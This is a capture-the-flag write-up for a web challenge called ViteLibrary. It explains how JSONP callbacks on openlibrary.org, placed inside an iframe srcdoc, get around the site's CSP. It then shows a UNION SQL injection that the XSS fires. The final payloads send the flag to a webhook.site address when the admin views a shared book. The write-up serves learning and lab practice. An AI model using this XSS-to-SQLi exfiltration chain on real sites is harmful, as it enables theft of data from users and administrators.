# Challenge: ViteLibrary
- Category: Webex

## Description
To visit a reported link as admin:
Login with these credentials on separate browser:
admin:admin
Visit the share link. 

Target:
Make a solution script which auto exfiltrates the flag when admin visits a reported book. 
Provide walkthroughs on how you approached the challenge and found the parts to get the flag. 

## Flag: 
`nite{test_flag_stp}`

## Solution
From the readme i gathered that the flag is accessed when the admin visits a link and we need to extract that flag

Looking at the website, the login page is of no use to me but the title and author blocks might be vulnerable to xss injections, 

From `main.js`, i found 
```
app.use(
    helmet({
        contentSecurityPolicy: {
            directives: {
                "default-src": ["'self'", "openlibrary.org"],
                "img-src": [
                    "'self'",
                    "raw.githubusercontent.com",
                    "external-content.duckduckgo.com",
                ],
                "script-src": null,
                "script-src-attr": null,
                "upgradeInsecureRequests": null,
            },
        },
    })
);
```
looking more at the `openlibrary.org` documentation, i found that jsonp is supported with the callback parameter 
which means that csp is also being used here, anyways to confirm xss injections i tried 
```
<script src="https://openlibrary.org/api/books?bibkeys=ISBN:1234&callback=alert(1337);//"></script>
```
but i didnt really get a popup alert from this
looking further `libraryRoot.innerHTML += cardTemplate.replace("Book Title", book.title)` is what is stopping this from executing.

Looking for ways to bypass this i found `https://stackoverflow.com/questions/8874862/xss-attack-through-iframe-src`

Now,
```
<iframe srcdoc="hii<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback=alert(420);//'></script>ii"></iframe>
```
<img width="784" height="287" alt="image" src="https://github.com/user-attachments/assets/e0b61a4d-b34c-4ed9-8490-5a24009e2082" />

Since i cant click on the link of the book ive made, i got its liteid from `http://localhost:50001/getBooks` and got my new book url as `http://localhost:50001/liteShare/earff/6Pf30yy60B`

now that ive gotten the xss to work, i just need to extract the flag, going thru the main file again i found `/api/delete` as a point for an sqli injection and since only `union` is allowed acc to utils.js

`" UNION SELECT link as title FROM BOOKS WHERE link LIKE "%flag%" --`

basic union injection. with union, the number of columns has to match, but since every row has a link field, we’re good. After the union, we’re selecting link as title so the column name lines up with what the original query expects.

FROM BOOKS is just grabbing the whole table, and WHERE link LIKE "%flag%" filters for anything that looks like a flag. the % signs are wildcards because we don’t know the exact flag value.
the -- just comments out the rest of the original query so nothing breaks.

thus my final payload was

```
<iframe
srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&jscmd=viewapi&callback=fetch('/api/delete?title='+encodeURIComponent('" UNION SELECT link as title FROM BOOKS WHERE link LIKE "%flag%" --'),{method:'POST'}).then(r=>r.json()).then(d=>window.top.location='https://webhook.site/09c8ca76-2483-4c7b-8c05-9f0bdfc5aadf?flag='+encodeURIComponent(d.book.title))'
></script>"></iframe>
```
but logging into admin didnt redirect me to my webhook, so url encoding was the next thing to do 
```
<iframe
srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&jscmd=viewapi&callback=fetch(%27%2Fapi%2Fdelete%3Ftitle%3D%27%2BencodeURIComponent(%27%22%20UNION%20SELECT%20link%20as%20title%20FROM%20BOOKS%20WHERE%20link%20LIKE%20%22%25flag%25%22%20--%27)%2C%7Bmethod%3A%27POST%27%7D).then(r%3D%3Er.json()).then(d%3D%3E%7Bwindow.top.location%3D%27https%3A%2F%2Fwebhook.site%2F09c8ca76-2483-4c7b-8c05-9f0bdfc5aadf%3Fflag%3D%27%2BencodeURIComponent(d.book.title)%7D)'
></script>"></iframe>
```

Running this and then logging into admin and accessing the link i.e `http://localhost:50001/liteShare/test123/B6LW1jf43X` redirected me to my webhook page

<img width="664" height="84" alt="image" src="https://github.com/user-attachments/assets/0c9856e4-2f6d-41f0-af4f-5c05ccfa84d9" />

and i got the flag in my inbox

<img width="1604" height="747" alt="image" src="https://github.com/user-attachments/assets/ae4ee178-6938-41ba-bb04-5a85b22f7e23" />


